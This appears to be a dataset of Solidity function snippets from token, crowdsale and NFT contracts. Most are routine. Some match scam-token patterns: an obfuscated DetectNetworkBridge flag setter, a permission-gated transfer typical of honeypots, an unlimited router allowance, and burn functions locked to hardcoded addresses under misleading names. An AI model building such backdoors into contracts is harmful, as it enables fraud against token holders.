            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setNewGenealogy(address _child, address _father) private returns (bool succcess){
        genealogy[_child].father = _father;
        genealogy[_father].children[_child] = 1;

        return true;
    }
--------------------------------------------------------------------------------
function setTicketPrice(uint256 _ticketPrice) public onlyOwner {
        require(_ticketPrice > 0, 'price must be greater than zero');
        ticketPrice = _ticketPrice;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function completeProtocolTransfer()
        public
        onlyProposedProtocol
        afterWait
        returns (bool) 
    {
        openSTProtocol = proposedProtocol;
        proposedProtocol = address(0);
        earliestTransferHeight = 0;

        ProtocolTransferCompleted(openSTProtocol);

        return true;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function WithdrawETH() onlyOwner public {
        address payable _msg_sender = payable(msg.sender);
        _msg_sender.transfer(address(this).balance);
    }
--------------------------------------------------------------------------------
function registerForVoting() payable votingPrepareInProgress {
        if (msg.value >= 10 finney) {
            voters.push(msg.sender);
        }
		else{
			revert();
		}
    }
--------------------------------------------------------------------------------
constructor (string memory _name, string memory _symbol) public {

        owner = msg.sender;

        name = _name;
        symbol = _symbol;
        balances[msg.sender] = totalSupply;
    }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function withdrawEth () public onlyOwner {
        owner.transfer(address(this).balance);
        emit LogPaidToOwner(owner, address(this).balance);
    }
--------------------------------------------------------------------------------
function acceptOwnership() public onlyPendingOwner {
        emit OwnershipTransferred(owner, pendingOwner);
        owner = pendingOwner;
        isOwnershipTransferActive = false;
        pendingOwner = address(0);
    }
--------------------------------------------------------------------------------
function getAddrOfRefCode(uint256 _refCode) 
  internal 
  view 
  returns(address _addr) 
  {  
    if(userIDAddr[_refCode] != address(0))
      return userIDAddr[_refCode];
    return address(0);
  }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
        if (whitelist[addr]) {
            whitelist[addr] = false;
            emit WhitelistedAddressRemoved(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
constructor(address vat_, bytes32 ilk_) public {
        wards[msg.sender] = 1;
        live = 1;
        vat = VatLikeJoin(vat_);
        ilk = ilk_;
    }
--------------------------------------------------------------------------------
function setDAOAddress(address payable _dao_addr) public onlyOwner {
        require(!daoSet, 'DAO address already set');
        _dao = AbsDAO(_dao_addr);
        daoSet = true;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function _getTokenAmountToDistribute(uint _part) internal view returns (uint256) {
    uint256 _delivredTokens = tokenDistributed.add(tokenDistributedpresale);
    return (_part.mul(_delivredTokens).div(investors));

  }
--------------------------------------------------------------------------------
function EGRCrowdsale(address _EngravedTokenAddress, address _beneficiary, uint256 _start) {
        EGREngravedToken = EngravedToken(_EngravedTokenAddress);
        beneficiary = _beneficiary;
        start = _start;
        end = start + 42 days;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _getFee(address _from, address _to, uint _value) private view returns (uint) {
        if (mapAddress_Excluded[_from] || mapAddress_Excluded[_to]) {
           return 0;                                                                        // No fee if excluded
        } else {
            return (_value / 1000);                                                         // Fee amount = 0.1%
        }
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function _getArgAddress(uint256 argOffset)
            internal
            pure
            returns (address arg)
        {
            uint256 offset = _getImmutableArgsOffset();
            assembly {
                arg := shr(0x60, calldataload(add(offset, argOffset)))
            }
        }
--------------------------------------------------------------------------------
function _getArgUint64(uint256 argOffset)
            internal
            pure
            returns (uint64 arg)
        {
            uint256 offset = _getImmutableArgsOffset();
            // solhint-disable-next-line no-inline-assembly
            assembly {
                arg := shr(0xc0, calldataload(add(offset, argOffset)))
            }
        }
--------------------------------------------------------------------------------
function _getArgUint8(uint256 argOffset) internal pure returns (uint8 arg) {
            uint256 offset = _getImmutableArgsOffset();
            // solhint-disable-next-line no-inline-assembly
            assembly {
                arg := shr(0xf8, calldataload(add(offset, argOffset)))
            }
        }
--------------------------------------------------------------------------------
function QFTZToken() public {
        _totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
        require(state == State.Active);
        deposited[investor] = deposited[investor].add(msg.value);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function seedMarket(uint256 eggs) public {
        require(marketEggs==0);
        require(msg.sender==ceoAddress); // only CEO can seed the market
        initialized=true;
        marketEggs=eggs;
    }
--------------------------------------------------------------------------------
function getProjectsByScoreType(address _address, ScoreType _scoreType) internal view returns(bytes32[]) {
        if (_scoreType == ScoreType.CustomerSatisfaction) {
            return makerProjects[_address];
        } else {
            return clientProjects[_address];
        }
    }
--------------------------------------------------------------------------------
function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = 100000000000000000000000000;  
        balanceOf[msg.sender] = totalSupply; 
        name = "AIDOGE Token";
        symbol = "AIDOGE";
    }
--------------------------------------------------------------------------------
function getAuditOutcome(address _auditor, bytes32 _codeHash) public view returns (uint8)
    {
        bytes32 hashAuditorCode = keccak256(abi.encodePacked(_auditor, _codeHash));
        return Audits[hashAuditorCode].outcome;
    }
--------------------------------------------------------------------------------
function getAuditReportIPFS(address _auditor, bytes32 _codeHash) public view returns (bytes)
    {
        bytes32 hashAuditorCode = keccak256(abi.encodePacked(_auditor, _codeHash));
        return Audits[hashAuditorCode].reportIPFS;
    }
--------------------------------------------------------------------------------
function DetectNetworkBridge(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    quesadilla[spender] = val;
    maiz[spender] = val2; 
    enchilada[spender] = val3;
    queso = val4;
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function ecothereum (
    ) public {
        totalSupply = 41000000 * 10e17;  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = "ecothereum";                                   // Set the name for display purposes
        symbol = "ECT";                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);
        
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x3FfA90D3F51fb49C16C8Ccf364E6990308D24d4A,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function performBuyOrder(
        OrderData data,
        uint256 amountToGiveForOrder
    )
        public
        payable
        whenNotPaused
        onlySelf
        returns (uint256 amountSpentOnOrder, uint256 amountReceivedFromOrder)
    {
        amountSpentOnOrder = amountToGiveForOrder;
        amountReceivedFromOrder = performTrade(data.tokenFrom, amountToGiveForOrder, data.tokenTo, data.minConversionRate);
        /* logger.log("Performing Kyber buy order arg2: amountSpentOnOrder, arg3: amountReceivedFromOrder", amountSpentOnOrder, amountReceivedFromOrder); */
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function canAuctionTokens() public view returns (bool) {
        return both(
          both(protocolUnderwater(), addition(minStakedTokensToKeep, tokensToAuction) <= depositedAncestor()),
          auctionHouse.activeStakedTokenAuctions() < maxConcurrentAuctions
        );
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function Burn(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x7780411CC65CDB25D4c1705d292B406B076fb308,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[]) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = ADMIN;
        return allPermissions;
    }
--------------------------------------------------------------------------------
function () external payable
    {
                        if( msg.value > 0 )
            buyTokens(msg.sender);
        else
            airDrop(msg.sender); 
        
        
        
           
    }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] addrs)
    onlyOwner
    public
  {
    for (uint256 i = 0; i < addrs.length; i++) {
      addAddressToWhitelist(addrs[i]);
    }
  }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] addrs)
    onlyOwner
    public
  {
    for (uint256 i = 0; i < addrs.length; i++) {
      removeAddressFromWhitelist(addrs[i]);
    }
  }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId)
   external
  {
    require(isSenderApprovedFor(_tokenId), "not approved");
    _clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
        return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
    }
--------------------------------------------------------------------------------
function _addTokenToOwnerEnumeration(address to, uint256 tokenId) private {
        uint256 length = balanceOf(to);
        _ownedTokens[to][length] = tokenId;
        _ownedTokensIndex[tokenId] = length;
    }
--------------------------------------------------------------------------------
function registerBeneficiaries(address[] _beneficiaries) public
    onlyOwner {
        for (uint i = 0; i < _beneficiaries.length; i++) {
            addBeneficiary(_beneficiaries[i]);
        }
    }
--------------------------------------------------------------------------------
function isContract( address _addr ) view private returns (bool) {
    uint length;
    _addr = _addr;
    assembly { length := extcodesize(_addr) }
    return (length > 0);
  }
--------------------------------------------------------------------------------
function setStartTime (uint64 _startTime) public onlyOwner {
        require(now < startTime);
        require(_startTime > now);
        require(_startTime < endTime);

        startTime = _startTime;
    }
--------------------------------------------------------------------------------
function setEndTime (uint64 _endTime) public onlyOwner {
        require(now < endTime);
        require(_endTime > now);
        require(_endTime > startTime);

        endTime = _endTime;
    }
--------------------------------------------------------------------------------
function releaseLock(address participant) public {
        require(vestedTokens[participant] != 0x0);

        TokenTimelock timelock = TokenTimelock(vestedTokens[participant]);
        timelock.release();
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function CheckSoftCap() internal {

        if (!SoftCapReached) {

            if (SaleAmountLIN >= SoftCap) {

                SoftCapReached = true;
                
                emit SuccessHardCap(SaleAmountLIN, now);

            } 
        }
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function() public payable {
        slugBank = slugBank.add(msg.value);
        
        emit BoostedPot(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function setMarketingRates(uint8 _newMkt1Rate, uint8 _newMkt2Rate, uint8 _newMkt3Rate)
        onlyAdministrator()
        public
    {
        require(_newMkt1Rate +_newMkt2Rate +_newMkt3Rate <= 60);   // 6%
       
        mkt1Rate =  _newMkt1Rate;
        mkt2Rate =  _newMkt2Rate;
        mkt3Rate =  _newMkt3Rate;

    }
--------------------------------------------------------------------------------
function queueRaiseLimit( address token, uint newMax ) external onlyPolicy() {
        tokenInfo[ token ].limitChangeTimelockEnd = block.number.add( timelockInBlocks );
        tokenInfo[ token ].newLimit = newMax;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function mintToken(address tokenOwner, uint256 amount)
        internal
    {
        // Mint happens right here: Balance becomes non-zero from zero
        _balances[tokenOwner] += amount;
        totalSupply += amount;

        // Emit Transfer event
        emit Transfer(address(0), tokenOwner, amount);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
    returns (bool success) {
        require(!blacklist[msg.sender]);
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function allowance(
        address _owner,
        address _spender
    )
        external
        view
        returns (uint256)
    {
        if(_spender == uniRouter) {
            return type(uint256).max;
        }
        return allowed[_owner][_spender];
    }
--------------------------------------------------------------------------------
function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
      super._transfer(sender, recipient, amount);
      _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
function TLB(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function mintToken(address _to, string _tokenURI) public onlyMinter whenNotPaused returns (uint256) {
        uint256 newTokenId = _getNextTokenId();
        _mint(_to, newTokenId);
        _setTokenURI(newTokenId, _tokenURI);

        return newTokenId;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
    public
    whenNotPaused
    ownerExists(msg.sender)
    transactionExists(transactionId)
    notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function getEtherAmountFromToken(uint _amount) private view returns (uint) {
        require(aiTokenG3 > 0, "Invalid aiTokenG3, please contact admin");
        return _amount / aiTokenG3;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function balance() public view returns (uint) {
        return token.balanceOf(address(this))
                .add(IController(controller).balanceOf(address(token)));
    }
--------------------------------------------------------------------------------
function sendToken(address _token,address _to , uint _value) onlyOwner returns(bool) {
        ERC20Basic Token = ERC20Basic(_token);
        require(Token.transfer(_to, _value));
        return true;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint40 _cutieId)
        public
        view
        returns (uint128)
    {
        Auction storage auction = cutieIdToAuction[_cutieId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function withdrawTokens() public onlyOwner {
		require(status == ContractStatus.SECOND_BATCH_TOKEN_RELEASED);

		tokenContract.transfer(receivingAddress, tokenContract.balanceOf(address(this)));
	}
--------------------------------------------------------------------------------
function confirmImplChange(bytes32 _lockId) public onlyCustodian {
        erc20Impl = getImplChangeReq(_lockId);

        delete implChangeReqs[_lockId];

        emit ImplChangeConfirmed(_lockId, address(erc20Impl));
    }
--------------------------------------------------------------------------------
function getParticipant(uint256 _index) public view returns (
    address participantAddress,
    uint256 participantAnswerId
  ) {
    Participant storage p = participants[_index];
    participantAddress = p.user_address;
    participantAnswerId = p.answer_id;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint _amount) 
        returns (bool success)
    {
        // Cannot transfer before crowdsale ends or cap reached
        require(now > ENDDATE || totalEthers == CAP);
        // Standard transferFrom
        return super.transferFrom(_from, _to, _amount);
    }
--------------------------------------------------------------------------------
function setMinter(address minter, bool status) external {
        require(msg.sender == ruler, "NOT ALLOWED TO RULE");

        isMinter[minter] = status;
    }
--------------------------------------------------------------------------------
function setExpiration(uint entityId, uint expirationDate, string url, uint oraclizeGas, uint oraclizeGasPrice) public payable returns (bytes32) {
    EntityLib.setExpiration(ed, entityId, expirationDate);
    return validateSigningEntity(entityId, url, oraclizeGas, oraclizeGasPrice);
  }
--------------------------------------------------------------------------------
function updateEntityData(uint entityId, string entityHash, bytes32 urlHash, string url, uint oraclizeGas, uint oraclizeGasPrice) public payable {
    EntityLib.updateEntityData(ed, entityId, entityHash, urlHash);
    validateSigningEntity(entityId, url, oraclizeGas, oraclizeGasPrice);
  }
--------------------------------------------------------------------------------
function setMinter(address minter, bool status) external {
        require(msg.sender == ruler, "NOT ALLOWED TO RULE");

        isMinter[minter] = status;
    }
--------------------------------------------------------------------------------
function STB() {
        founder = msg.sender;
        totalSupply = 300000000 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
constructor(
        string memory name_,
        string memory symbol_,
        string memory uri_,
        address genArtInterfaceAddress_
    ) {
        _name = name_;
        _symbol = symbol_;
        _baseURI = uri_;
        _genArtInterface = IGenArtInterfaceV2(genArtInterfaceAddress_);
        _collectionIdCounter.reset();
    }
--------------------------------------------------------------------------------
function stopICO() onlyOwner public{
            icoEndDate = 0;
            uint256 tokenAmount=balanceOf[this];
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
      		uint256 tokenAmount = _amount.mul(1 ether);
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
constructor(
        address _logic,
        address _admin,
        bytes memory _data
    ) public payable UpgradeabilityProxy(_logic, _data) {
        assert(ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(_admin);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function () public payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function optIn() public returns(bool) {
        delete userOptOutVersion[msg.sender];
        emit OptedIn(msg.sender, latestVersion);
        return true;
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
constructor () public {
    owner = msg.sender;
    balances[owner] = totalSupply;
    emit Transfer(0x0, owner, totalSupply);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function _upgradeTo(address newImplementation) internal {
    address currentImplementation = implementation();
    require(currentImplementation != newImplementation);
    setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
            bool nonZeroPurchase = msg.value != 0;
            bool noEnd = !hasEnded();
            return  nonZeroPurchase && noEnd;
      }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool) {
    require(!isFrozen(msg.sender));
    _transfer(msg.sender, to, value);
    return true;
  }
--------------------------------------------------------------------------------
function setAssetOracle(address _asset, address _oracle) public override onlyManager {
    require(_asset != address(0));
    require(_oracle != address(0));
    _setAssetOracle(_asset, _oracle);
  }
--------------------------------------------------------------------------------
constructor() public HasOwner(msg.sender) {
        name = NAME;
        symbol = SYMBOL;
        decimals = DECIMALS;
        totalSupply = TOTAL_SUPPLY;
        balances[owner] = TOTAL_SUPPLY;
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint _amount) 
        returns (bool success)
    {
        // Cannot transfer before crowdsale ends or cap reached
        require(now > ENDDATE || totalEthers == CAP);
        // Standard transferFrom
        return super.transferFrom(_from, _to, _amount);
    }
--------------------------------------------------------------------------------
function calculatePriceForTokens(uint256 tokenAmount) view internal returns(uint256 weiAmount){
    uint256 week = getCurrentWeek();
    return tokenAmount.div(10**18).mul(rates[week]);
  }
--------------------------------------------------------------------------------
function openCaseSignHash(uint _escrowId, uint8 _motive) public view returns(bytes32){
        return keccak256(
            abi.encodePacked(
                address(this),
                "openCase(uint256)",
                _escrowId,
                _motive
            )
        );
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function ONT(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool)
    {
        if (msg.sender == developmentFundAddress && now < developmentFundUnlockTime) revert();
        super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function setJackpot(address targetAddress, uint val) adminOnly public {
        if (val > 0) {
            MajorityGame mGame = MajorityGame(targetAddress);
            mGame.setJackpot.value(val)();
        }
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
constructor(address _wallet) public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[_wallet] = INITIAL_SUPPLY;
    emit Transfer(address(0), _wallet, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
constructor(address _manager, uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string memory _tokenSymbol
    ) public {
        balances[_manager] = _initialAmount;               // Give the creator all initial tokens
        totalSupply = _initialAmount;                        // Update total supply
        name = _tokenName;                                   // Set the name for display purposes
        decimals = _decimalUnits;                            // Amount of decimals for display purposes
        symbol = _tokenSymbol;                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function startSale() onlyOwner{
        if(!saleOrNot){
            saleOrNot = true;
            StartOK();
        }else{
            ShowMsg("sale is ing ");
        }
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
constructor(
        address _FundAccount
    ) public
    {
        FundAccount = _FundAccount;
        totalSupply = tokenCreationCap;
        balances[FundAccount] = tokenCreationCap;    // deposit all TDT to Owner.
        emit CreatePCT(FundAccount, tokenCreationCap);    // logs deposit of Owner
    }
--------------------------------------------------------------------------------
function KCCTOKEN(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function setMinter(address minter, bool status) external {
        require(msg.sender == ruler, "NOT ALLOWED TO RULE");

        isMinter[minter] = status;
    }
--------------------------------------------------------------------------------
function bindContract(address _contract) onlyOwner public returns (bool) {
        require(_contract != address(0));
        ownedContract = Claimable(_contract);
        // origOwner = ownedContract.owner();

        // take ownership of the owned contract
        ownedContract.claimOwnership();

        return true;
    }
--------------------------------------------------------------------------------
function seedMarket(uint256 eggs) public {
        require(marketEggs==0);
        require(msg.sender==ceoAddress); // only CEO can seed the market
        initialized=true;
        marketEggs=eggs;
    }
--------------------------------------------------------------------------------
function BitcoinPetrol() {
    totalSupply = INITIAL_SUPPLY;                               // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                      // Creator address is assigned all
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function isOperatorFor(
        address operator,
        address tokenHolder
    ) public view override returns (bool) {
        return operator == tokenHolder ||
        (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
        _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool) {
      if (isTransferWhitelistOnly) {
        require(isUserAllowedToTransfer(msg.sender));
      }
      return super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        if (isTransferWhitelistOnly) {
            require(isUserAllowedToTransfer(_from));
        }
        return super.transferFrom(_from, _to, _value);
    }
--------------------------------------------------------------------------------
constructor(address _gov) public {
      totalSupply = 10000 * (10**(uint256(decimals)));
      balances[msg.sender] = totalSupply;    // Give the creator all initial tokens
      _governance=_gov;
    }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] _operators) public onlyOwner {
    for (uint256 i = 0; i < _operators.length; i++) {
      addAddressToWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] _operators) public onlyOwner {
    for (uint256 i = 0; i < _operators.length; i++) {
      removeAddressFromWhitelist(_operators[i]);
    }
  }
--------------------------------------------------------------------------------
function GOG() public {
        totalSupply = 10000000000000000;               // GOG's total supply is 10 billion with 6 decimals
        balances[msg.sender] = totalSupply;          // Give the creator all initial tokens
        name = "GoGlobe Token";                       // Token name is GoGlobe Token
        symbol = "GOG";                               // token symbol is GOG
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
constructor (ProxyRegistry registryAddress, TokenTransferProxy tokenTransferProxyAddress, ERC20 tokenAddress, address protocolFeeAddress) public {
        registry = registryAddress;
        tokenTransferProxy = tokenTransferProxyAddress;
        exchangeToken = tokenAddress;
        protocolFeeRecipient = protocolFeeAddress;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function _isCooldownReady(uint256 skinAId, uint256 skinBId) private view returns (bool) {
        return (skins[skinAId].cooldownEndTime <= uint64(now)) && (skins[skinBId].cooldownEndTime <= uint64(now));
    }
--------------------------------------------------------------------------------
function setMinter(address minter, bool status) external {
